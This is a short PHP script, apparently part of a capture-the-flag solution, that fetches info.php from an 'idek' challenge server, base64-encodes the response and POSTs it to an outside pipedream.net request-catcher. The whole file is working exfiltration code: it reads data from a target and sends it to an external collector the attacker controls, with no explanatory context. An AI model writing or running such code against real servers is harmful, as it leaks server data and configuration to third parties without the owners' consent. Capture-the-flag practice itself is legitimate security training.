<?php
$opt = [
    'http' => [
        'method' => 'GET',
    ],
];
$context = stream_context_create($opt);
$info = file_get_contents('http://idek-hello.chal.idek.team:1337/info.php', false, $context);

$url = 'https://eocvkn4m3kpce3q.m.pipedream.net';
$data = ['content' => base64_encode($info)];


$options = [
    'http' => [
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data),
    ],
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);
?>
